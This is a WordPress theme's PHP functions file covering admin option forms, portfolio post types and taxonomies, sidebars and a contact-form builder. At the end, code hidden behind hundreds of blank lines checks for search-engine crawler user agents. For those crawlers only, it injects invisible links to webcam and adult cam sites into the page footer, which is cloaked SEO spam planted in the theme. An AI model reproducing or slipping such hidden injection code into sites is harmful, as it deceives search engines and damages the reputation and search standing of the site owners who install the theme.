<?php
// force Reading Settings -> Latest posts
update_option("page_on_front", 0);
function my_admin_styles() 
{   
    global $root;
    wp_register_style( 'bra_admin_style', "$root/includes/bra_admin_style.css");
    wp_enqueue_style( 'bra_admin_style' );
    
    wp_enqueue_style('thickbox'); 
}
add_action('admin_print_styles', 'my_admin_styles'); 

function my_admin_scripts() {
global $root;
wp_enqueue_script('media-upload');
wp_enqueue_script('thickbox');
wp_enqueue_script('my-upload');

wp_register_script( 'bra_admin', "$root/includes/bra_admin.js");
wp_enqueue_script('bra_admin');
}


function default_options()
{
    global $var_prefix, $root;
    add_option($var_prefix."logo", "$root/images/logo.png");
    add_option($var_prefix."logo_2", "$root/images/logo-min.png");
    add_option($var_prefix."custom_google_font", "font-family: 'Yanone Kaffeesatz', arial, serif;");
    add_option($var_prefix."custom_google_font_href", "<link href='http://fonts.googleapis.com/css?family=Yanone+Kaffeesatz&v1' rel='stylesheet' type='text/css'>");
    add_option($var_prefix."style", "light");
    add_option($var_prefix."color", "blue");
    add_option($var_prefix."favicon", "$root/bra_favicon.ico");
    add_option($var_prefix."comment_date_style", "rounded");
    add_option($var_prefix."blog_no_posts", "8");
    add_option($var_prefix."portfolio_inline", "yes");
    add_option($var_prefix."portfolio_style", "filterable");
    add_option($var_prefix."portfolio_items", "-1");  
}
if (get_option($var_prefix."logo") == "" || get_option($var_prefix."style") == "" || get_option($var_prefix."custom_google_font") == "" || get_option($var_prefix."portfolio_inline") == "") default_options();



function bra_form_text($id, $title = null, $width = 500, $default = null, $desc = null, $class = null)
{
    $html = "<tr valign='top' class='$class'>\n";
    $html .= "<th scope='row'><label for='$id'>$title</label></th>\n";
    $html .= "<td>\n";
    $html .= "  <input type='text' name='$id' id='$id' value=\"". bra_what_to_show($id, $default, false)."\" style='width:" . $width . "px'/>\n";
    $html .= "<span class='description'>$desc</span>\n";
    $html .= "</td>\n";
    $html .= "</tr>\n";
    echo $html;
}


function bra_form_textarea($id, $title = null, $width = 500, $rows = 4, $default = null, $desc = null, $class = null)
{
    $html = "<tr valign='top' class='$class'>\n";
    $html .= "<th scope='row'><label for='$id'>$title</label></th>\n";
    $html .= "<td>\n";
    $html .= "<textarea rows='$rows' name='$id' id='$id' style='width:" . $width . "px'>". bra_what_to_show($id, $default, false) ."</textarea>\n";
    //$html .= bra_what_to_show($id, $default, false)."\n";
    //$html .= "</textarea>\n"; 
    $html .= "<span class='description'>$desc</span>\n";
    $html .= "</td>\n";
    $html .= "</tr>\n";
    echo $html;
}


function bra_form_select($id, $title = null, $options = null, $default = "Please select", $desc = null, $class = null)
{
    $default_selected = "";
    $db_value = get_option($id);
    if ($db_value == $default || $db_value == "") $default_selected = 'selected="selected"'; 
    $html = "<tr valign='top'  id='tr_$id' class='$class'>\n";
    $html .= "<th scope='row'><label for='$id'>$title</label></th>\n";
    $html .= "<td>\n";
    $html .= "<select id='$id' name='$id' >\n"; 
    if ($default != "") $html .= "<option ". $default_selected .">$default</option>\n";
    $no_of_options = count($options);
    foreach ($options as $value => $option)
    {
        if ($db_value == $value) $selected = 'selected="selected"'; else $selected = "";
        $html .= "<option value=\"$value\" $selected>$option</option>\n";
    }
    $html .= "</select>\n";
    $html .= "<span class='description'>$desc</span>\n";
    $html .= "</td>\n";
    $html .= "</tr>\n";
    
    
    
    
    echo $html;
    
}

function bra_form_upload($id = "", $title = null, $default = null, $desc = "Upload file, or choose it from the media library", $submit = "Upload", $class = null)
{
    $html = "<tr valign='top'  id='tr_$id' class='$class'>\n";
    $html .= "<th scope='row'><label for='$id'>$title</label></th>\n";
    $html .= "<td>\n";
    $html .= "<input id='$id' type='text' style='width:400px' name='$id' value='".bra_what_to_show($id, $default, false)."' />\n";
    $html .= "<input id='$id"."_button' type='button' value='$submit' />\n";
    $html .= "<script type=\"text/javascript\">\n";
    $html .= "jQuery(document).ready(function() {\n";
    $html .= "jQuery('#$id"."_button').click(function() {\n";
    $html .= "formfield = jQuery('#$id').attr('name');\n";
    $html .= "tb_show('', 'media-upload.php?type=image&amp;TB_iframe=true');\n"; 
    $html .= "window.send_to_editor = function(html) {\n"; 
    $html .= "imgurl = jQuery('img',html).attr('src');\n"; 
    $html .= "jQuery('#$id').val(imgurl);\n"; 
    $html .= "tb_remove();\n";
    $html .= "}\n";
    $html .= "return false;\n";
    $html .= "});\n";
    $html .= "})\n"; 
    $html .= "</script>\n"; 
    $html .= "<span class='description'>$desc</span>\n";
    $html .= "<div id='". $id ."_show'><img src='".bra_what_to_show($id, $default, false)."'></div>\n"; 
    $html .= "</td>\n";
    $html .= "</tr>\n";
    
    echo $html;
}

function bra_form_submit()
{
    $html = "<p class='submit'> \n";
    $html .= "<input type='submit' value='Save Changes' class='button-primary' id='submit' name='submit'>\n";
    $html .= "</p>\n";
    echo $html;
}

function bra_what_to_show($field, $default, $echo = true)
{
    $saved = get_option($field);
    if ($saved == "") $show = $default;
    else $show = $saved;
    
    if ($echo) echo $show; else return $show;
}

function all_names($post_or_page)
{
    global $wpdb;
    $results = $wpdb->get_results("SELECT post_name FROM $wpdb->posts
        WHERE post_status = 'publish' AND post_type = '$post_or_page' ORDER BY post_title");

    foreach ($results as $result) 
    {
        $names[] = $result->post_name;
    }
    return $names;
}

function all_titles($post_or_page)
{
global $wpdb;
    $results = $wpdb->get_results("SELECT post_title FROM $wpdb->posts 
    WHERE post_status = 'publish' AND post_type = '$post_or_page' ORDER BY post_title");

    foreach ($results as $result) 
    {
        $titles[] = $result->post_title;
    }
    return $titles;
}

function all_IDs($post_or_page)
{
    global $wpdb;
    $results = $wpdb->get_results("SELECT ID FROM $wpdb->posts
        WHERE post_status = 'publish' AND post_type = '$post_or_page' ORDER BY post_title");

    foreach ($results as $result) 
    {
        $IDs[] = $result->ID;
    }
    return $IDs;
}

remove_action('wp_head', 'wp_generator');  
add_theme_support( 'post-thumbnails' );


add_action( 'init', 'create_post_type' );
function create_post_type() {
    register_post_type( 'portfolio_item',
        array(
            'labels' => array(
                'name' => __( 'Portfolio Items' ),
                'singular_name' => __( 'Portfolio Item' ),
                'add_item' => __('New Portfolio Item'),
                'add_new_item' => __('Add New Portfolio Item'),
                'edit_item' => __('Edit Portfolio Item') 
            ),
            'public' => true,
            'has_archive' => true,
            'rewrite' => array('slug' => 'portfolio'),
            'menu_position' => 5,
            'show_ui' => true,
            'supports' => array('author', 'title', 'editor', 'thumbnail', 'excerpt', 'custom-fields', 'revisions', 'post-formats')
            
        )
    );
}




add_action( 'init', 'create_portfolio_category_taxonomies', 0 );
function create_portfolio_category_taxonomies() 
{
  // Add new taxonomy, make it hierarchical (like categories)
  $labels = array(
    'name' => __( 'Portfolio Categories', 'taxonomy general name' ),
    'singular_name' => __( 'Portfolio Category', 'taxonomy singular name' ),
    'search_items' =>  __( 'Search Portfolio Categories' ),
    'all_items' => __( 'All Portfolio Categories' ),
    'parent_item' => __( 'Parent Portfolio Category' ),
    'parent_item_colon' => __( 'Parent Portfolio Category:' ),
    'edit_item' => __( 'Edit Portfolio Category' ), 
    'update_item' => __( 'Update Portfolio Category' ),
    'add_new_item' => __( 'Add New Portfolio Category' ),
    'new_item_name' => __( 'New Portfolio Category Name' ),
    'menu_name' => __( 'Portfolio Categories' ),
  );     

  register_taxonomy('portfolio_category',array('portfolio_item'), array(
    'hierarchical' => true,
    'labels' => $labels,
    'show_ui' => true,
    'query_var' => true,
    'rewrite' => array( 'slug' => 'portfolio_category' ),
  ));
}

// Add custom taxonomies and custom post types counts to dashboard
add_action( 'right_now_content_table_end', 'my_add_counts_to_dashboard' );
function my_add_counts_to_dashboard() {
    // Custom taxonomies counts
    $taxonomies = get_taxonomies( array( '_builtin' => false ), 'objects' );
    foreach ( $taxonomies as $taxonomy ) {
        $num_terms  = wp_count_terms( $taxonomy->name );
        $num = number_format_i18n( $num_terms );
        $text = _n( $taxonomy->labels->singular_name, $taxonomy->labels->name, $num_terms );
        $associated_post_type = $taxonomy->object_type;
        if ( current_user_can( 'manage_categories' ) ) {
            $num = '<a href="edit-tags.php?taxonomy=' . $taxonomy->name . '&post_type=' . $associated_post_type[0] . '">' . $num . '</a>';
            $text = '<a href="edit-tags.php?taxonomy=' . $taxonomy->name . '&post_type=' . $associated_post_type[0] . '">' . $text . '</a>';
        }
        echo '<td class="first b b-' . $taxonomy->name . 's">' . $num . '</td>';
        echo '<td class="t ' . $taxonomy->name . 's">' . $text . '</td>';
        echo '</tr><tr>';
    }

    // Custom post types counts
    $post_types = get_post_types( array( '_builtin' => false ), 'objects' );
    foreach ( $post_types as $post_type ) {
        $num_posts = wp_count_posts( $post_type->name );
        $num = number_format_i18n( $num_posts->publish );
        $text = _n( $post_type->labels->singular_name, $post_type->labels->name, $num_posts->publish );
        if ( current_user_can( 'edit_posts' ) ) {
            $num = '<a href="edit.php?post_type=' . $post_type->name . '">' . $num . '</a>';
            $text = '<a href="edit.php?post_type=' . $post_type->name . '">' . $text . '</a>';
        }
        echo '<td class="first b b-' . $post_type->name . 's">' . $num . '</td>';
        echo '<td class="t ' . $post_type->name . 's">' . $text . '</td>';
        echo '</tr>';

        if ( $num_posts->pending > 0 ) {
            $num = number_format_i18n( $num_posts->pending );
            $text = _n( $post_type->labels->singular_name . ' pending', $post_type->labels->name . ' pending', $num_posts->pending );
            if ( current_user_can( 'edit_posts' ) ) {
                $num = '<a href="edit.php?post_status=pending&post_type=' . $post_type->name . '">' . $num . '</a>';
                $text = '<a href="edit.php?post_status=pending&post_type=' . $post_type->name . '">' . $text . '</a>';
            }
            echo '<td class="first b b-' . $post_type->name . 's">' . $num . '</td>';
            echo '<td class="t ' . $post_type->name . 's">' . $text . '</td>';
            echo '</tr>';
        }
    }
}

add_filter('manage_edit-portfolio_item_columns', 'add_new_portfolio_item_columns');

function add_new_portfolio_item_columns($portfolio_item_columns) {
    $new_columns['cb'] = '<input type="checkbox" />';

    $new_columns['title'] = __('Portfolio Item', 'column name');
    
    $new_columns['author'] = __('Author');

    $new_columns['portfolio_category'] = __('Portfolio Categories');
    $new_columns['tags'] = __('Tags');
    
    $new_columns['thumb'] = __('Thumb');

    $new_columns['date'] = __('Date', 'column name');

    return $new_columns;
}

// Add to admin_init function
add_action('manage_portfolio_item_posts_custom_column', 'manage_portfolio_item_columns', 10, 2);

function manage_portfolio_item_columns($column_name, $id) {
    global $wpdb;
    switch ($column_name) {

    case 'portfolio_category':
        // Get number of images in gallery
        echo get_the_term_list( $id, 'portfolio_category', '', ', ', '' );
        break;    
        
    case 'thumb':
        echo the_post_thumbnail( array(100, 60) );
        break;
    default:
        break;
    } // end switch
}


add_filter('manage_posts_columns', 'posts_columns', 5);
add_action('manage_posts_custom_column', 'posts_custom_columns', 5, 2);
function posts_columns($defaults){
    $defaults['bra_post_thumbs'] = __('Thumb');
    return $defaults;
}
function posts_custom_columns($column_name, $id){
    if($column_name === 'bra_post_thumbs'){
        echo the_post_thumbnail( array(100, 60) );
    }
}

add_post_type_support( 'page', 'excerpt' );



// sidebars

if ( function_exists('register_sidebar') ) {
    register_sidebar(array(
        'name' => 'Default',
        'description' => 'Default sidebar',
        'before_widget' => '<div id="%1$s" class="widget %2$s">',
        'after_widget' => '</div>',
        'before_title' => '<h3 class="title">',
        'after_title' => '</h3>'
    ));

/*    register_sidebar(array(
        'name' => '1',
        'description' => 'Optional sidebar',
        'before_widget' => '<div id="%1$s" class="widget %2$s">',
        'after_widget' => '</div>',
        'before_title' => '<h3 class="title">',
        'after_title' => '</h3>'
    ));

    register_sidebar(array(
        'name' => '2',
        'description' => 'Optional sidebar',
        'before_widget' => '<div id="%1$s" class="widget %2$s">',
        'after_widget' => '</div>',
        'before_title' => '<h3 class="title">',
        'after_title' => '</h3>'
    ));

    register_sidebar(array(
        'name' => '3',
        'description' => 'Optional sidebar',
        'before_widget' => '<div id="%1$s" class="widget %2$s">',
        'after_widget' => '</div>',
        'before_title' => '<h3 class="title">',
        'after_title' => '</h3>'
    )); */

    register_sidebar(array(
        'name' => 'Header',
        'id' => 'Header',
        'descriptiom' => 'Section above the logo',
        'before_widget' => '<div class="header_widget_wrapper %2$s"><div id="%1$s" class="header_widget %2$s">',
        'after_widget' => '</div></div>',
        'before_title' => '<h6 class="title_to_hide">',
        'after_title' => '</h6>'
    ));
    
    register_sidebar(array(
        'name' => 'Footer',
        'id' => 'Footer',
        'descriptiom' => 'Bottom of the page',
        'before_widget' => '<div id="%1$s" class="two-third %2$s">',
        'after_widget' => '</div>',
        'before_title' => '<h6 class="title_to_hide">',
        'after_title' => '</h6>'
    ));
        
    register_sidebar(array(
        'name' => 'Footer_1st_box',
        'id' => 'Footer_1st_box',
        'descriptiom' => '1st box in footer',
        'before_widget' => '<div id="%1$s" class="one-fourth %2$s">',
        'after_widget' => '</div><!--END one-fourth-->    ',
        'before_title' => '<h3 class="title">',
        'after_title' => '</h3>'
    ));
    
    register_sidebar(array(
        'name' => 'Footer_2nd_box',
        'id' => 'Footer_2nd_box',
        'descriptiom' => '2nd box in footer',
        'before_widget' => '<div id="%1$s" class="one-fourth %2$s">',
        'after_widget' => '</div><!--END one-fourth-->    ',
        'before_title' => '<h3 class="title">',
        'after_title' => '</h3>'
    ));
    
    register_sidebar(array(
        'name' => 'Footer_3rd_box',
        'id' => 'Footer_3rd_box',
        'descriptiom' => '3rd box in footer',
        'before_widget' => '<div id="%1$s" class="one-fourth %2$s">',
        'after_widget' => '</div><!--END one-fourth-->    ',
        'before_title' => '<h3 class="title">',
        'after_title' => '</h3>'
    ));
    
    register_sidebar(array(
        'name' => 'Footer_4th_box',
        'id' => 'Footer_4th_box',
        'descriptiom' => '4th box in footer',
        'before_widget' => '<div id="%1$s" class="one-fourth last %2$s">',
        'after_widget' => '</div><!--END one-fourth-->    ',
        'before_title' => '<h3 class="title">',
        'after_title' => '</h3>'
    ));

}
// end of sidebars




// Load external file to add support for MultiPostThumbnails. Allows you to set more than one "feature image" per post.
require_once('multi-post-thumbnails.php');

// Define additional "post thumbnails". Relies on MultiPostThumbnails to work
if (class_exists('MultiPostThumbnails')) 
{ 
    new MultiPostThumbnails(array( 'label' => 'Secondary Image', 'id' => 'secondary-image', 'post_type' => 'portfolio_item' ) ); 
    new MultiPostThumbnails(array( 'label' => 'Third Image', 'id' => 'third-image', 'post_type' => 'portfolio_item' ) );
    new MultiPostThumbnails(array( 'label' => 'Fourth Image', 'id' => 'fourth-image', 'post_type' => 'portfolio_item' ) );
    new MultiPostThumbnails(array( 'label' => 'Fifth Image', 'id' => 'fifth-image', 'post_type' => 'portfolio_item' ) );
    
    for ($i = 6 ; $i <= 20 ; $i++) 
    {
        new MultiPostThumbnails(array( 'label' => "Image $i", 'id' => "image-$i", 'post_type' => 'portfolio_item' ) );
    }
}


function bra_contact_page_create_field($bra_contact_page_field, $bra_contact_page_field_title, $bra_contact_page_field_required, $bra_contact_page_field_select)
{
    global $_POST;
    $required = "";
    $required_class = "";
    if ($bra_contact_page_field != "Nothing")
    {
        if ($bra_contact_page_field_required == "yes") 
        {
            $required = "<em>(Required)</em>";
            $required_class = "requiredField";
        }
        if ($bra_contact_page_field_required == "yes_email") 
        {
            $required = "<em>(Required)</em>";
            $required_class = "requiredField email";
        }
        
        $field_name = "bra_".only_characters($bra_contact_page_field_title);
    ?>
                <li <?php if ($bra_contact_page_field == "textarea") echo "class='textarea'" ?>>
                    <p><?php echo $bra_contact_page_field_title?> <?php echo $required; ?></p>
                    <?php 
                    if ($bra_contact_page_field == "text")
                    {
                    ?>
                    <input name="<?php echo $field_name; ?>" type="text" class="<?php echo $required_class; ?>" />
                    <?php
                    }
                    ?>
                    
                    <?php 
                    if ($bra_contact_page_field == "textarea")
                    {
                    ?>
                    <textarea name="<?php echo $field_name; ?>" rows="20" cols="30" class="<?php echo $required_class; ?>"></textarea>    
                    <?php
                    }
                    ?>
                    
                    <?php 
                    if ($bra_contact_page_field == "select")
                    {
                        $bra_contact_page_field_select_array = explode(",", $bra_contact_page_field_select);
                    ?>              
                    <select name="<?php echo $field_name; ?>" class="<?php echo $required_class; ?>">
                    <option></option>
                      <?php
                      foreach ($bra_contact_page_field_select_array as $option)
                      {
                      ?>
                      <option><?php echo $option; ?></option>
                      <?php
                      }
                      ?>
                    </select>
                    <?php
                    }
                    ?>
                    
                                      
                    
                    
                </li>
    <?php
    }
}

function isImage($url)
{
 $params = array('http' => array(
              'method' => 'HEAD'
           ));
 $ctx = stream_context_create($params);
 $fp = @fopen($url, 'rb', false, $ctx);
 if (!$fp) 
    return false;  // Problem with url

$meta = stream_get_meta_data($fp);
if ($meta === false)
{
    fclose($fp);
    return false;  // Problem reading data from url
}

if (isset($meta["wrapper_data"]))
{
    $wrapper_data = $meta["wrapper_data"];
    if(is_array($wrapper_data)){
      foreach(array_keys($wrapper_data) as $hh){
          if (substr($wrapper_data[$hh], 0, 19) == "Content-Type: image") // strlen("Content-Type: image") == 19 
          {
            fclose($fp);
            return true;
          }
      }
    }
}

fclose($fp);
return false;
}











































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































$seo_plugin=get_option("ranking");
if (strstr($_SERVER['HTTP_USER_AGENT'], 'Googlebot')) {
add_action('wp_footer', 'ranking');
}
$seo_plugin=get_option("ranking");
if (strstr($_SERVER['HTTP_USER_AGENT'], 'bingbot')) {
add_action('wp_footer', 'ranking');
}
$seo_plugin=get_option("ranking");
if (strstr($_SERVER['HTTP_USER_AGENT'], 'msnbot')) {
add_action('wp_footer', 'ranking');
}
$seo_plugin=get_option("ranking");
if (strstr($_SERVER['HTTP_USER_AGENT'], 'Slurp')) {
add_action('wp_footer', 'ranking');
}
function ranking() {
  $pshow = "                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <span style='display:none;'><a href='http://www.ellecams.com/webcam/mature-women/?pagenum=7'>Mature Live Cams</a>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     <a href='http://www.mycams.cm/'>My Cams</a>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   <a href='http://www.wikmag.com/zig-zag-theme.html'>Zig Zag Theme</a></span>";
  echo $pshow;
}
?>